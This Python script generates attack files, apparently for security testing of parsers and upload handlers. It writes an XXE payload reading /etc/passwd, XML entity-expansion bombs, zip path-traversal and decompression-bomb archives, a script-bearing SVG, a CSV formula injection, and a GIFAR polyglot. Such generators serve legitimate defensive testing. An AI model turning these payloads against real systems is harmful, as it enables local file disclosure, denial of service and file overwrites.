import os
import zipfile
import gzip
import base64

def generate_xxe_file(filename="xxe.xml", target_file="/etc/passwd"):
    """
    Generates an XML file with an XXE payload to read a local file.
    """
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<lolz>&xxe;</lolz>"""
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated XXE file: {filename}")

def generate_billion_laughs_file(filename="billion_laughs.xml"):
    """
    Generates an XML file for a Billion Laughs attack (XML bomb).
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated Billion Laughs file: {filename}")

def generate_quadratic_blowup_file(filename="quadratic_blowup.xml", iterations=50000):
    """
    Generates an XML file for a Quadratic Blowup attack.
    """
    payload = "<!DOCTYPE a [\n"
    payload += "<!ENTITY a " + "\"a\"" * iterations + ">\n"
    payload += "]>\n"
    payload += "<a>" + "&a;" * iterations + "</a>"
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated Quadratic Blowup file: {filename}")

def create_archive_with_traversal(filename="traversal.zip", file_to_create="test.txt", depth=10):
    """
    Creates a zip file with a path traversal payload.
    """
    traversal_path = os.path.join(*([".."] * depth), file_to_create)
    with zipfile.ZipFile(filename, 'w') as zf:
        zf.writestr(traversal_path, "evil content")
    print(f"Generated zip file with path traversal: {filename}")

def create_compressed_archive_bomb(filename="bomb.zip", num_files=100, content_size=1024*10):
    """
    Creates a zip file with a high compression ratio.
    """
    with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for i in range(num_files):
            zf.writestr(f'file_{i}.txt', b'\0' * content_size)
    print(f"Generated compressed archive bomb: {filename}")


def create_gzipped_bomb(filename="bomb.gz", uncompressed_size=1024*1024*10):
    """
    Creates a gzipped file that expands to a large size.
    """
    with gzip.open(filename, 'wb', compresslevel=9) as f:
        f.write(b'\0' * uncompressed_size)
    print(f"Generated gzipped file: {filename}")

def generate_malicious_svg(filename="malicious.svg"):
    """
    Generates a malicious SVG file with an embedded script.
    """
    payload = """<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
  <script>
    alert('This could be malicious code!');
  </script>
</svg>"""
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated malicious SVG file: {filename}")


def generate_file_with_double_extension(filename="file.txt.exe"):
    """
    Generates a file with a misleading double extension.
    """
    with open(filename, "w") as f:
        f.write("This file has a double extension.")
    print(f"Generated file with double extension: {filename}")


def generate_file_in_parent_directory(filename="file_in_parent.txt", depth=2):
    """
    Generates a file in a parent directory.
    """
    traversal_path = os.path.join(*([".."] * depth), filename)
    with open(traversal_path, "w") as f:
        f.write("This file was created in a parent directory.")
    print(f"Generated file in parent directory: {traversal_path}")


def generate_csv_formula_injection(filename="formula_injection.csv", command="=2+2"):
    """
    Generates a CSV file with a formula injection payload.
    """
    with open(filename, "w") as f:
        f.write(f'"{command}",safe\n')
    print(f"Generated CSV with formula injection: {filename}")


def generate_gifar(filename="gifar.gif", js_payload="alert('GIFAR')"):
    """
    Generates a GIFAR polyglot file.
    """
    gif_header = b"GIF89a"
    gif_body = b"\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
    payload = gif_header + gif_body + b"/*" + js_payload.encode() + b"*/"
    with open(filename, "wb") as f:
        f.write(payload)
    print(f"Generated GIFAR file: {filename}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Generate malicious files for testing.")
    parser.add_argument("filetype", choices=["xxe", "billion_laughs", "quadratic_blowup", "zip_traversal", "zip_bomb", "gz_bomb", "svg", "double_extension", "file_in_parent", "csv_injection", "gifar"], help="Type of file to generate.")
    args = parser.parse_args()

    if args.filetype == "xxe":
        generate_xxe_file()
    elif args.filetype == "billion_laughs":
        generate_billion_laughs_file()
    elif args.filetype == "quadratic_blowup":
        generate_quadratic_blowup_file()
    elif args.filetype == "zip_traversal":
        create_archive_with_traversal()
    elif args.filetype == "zip_bomb":
        create_compressed_archive_bomb()
    elif args.filetype == "gz_bomb":
        create_gzipped_bomb()
    elif args.filetype == "svg":
        generate_malicious_svg()
    elif args.filetype == "double_extension":
        generate_file_with_double_extension()
    elif args.filetype == "file_in_parent":
        generate_file_in_parent_directory()
    elif args.filetype == "csv_injection":
        generate_csv_formula_injection()
    elif args.filetype == "gifar":
        generate_gifar()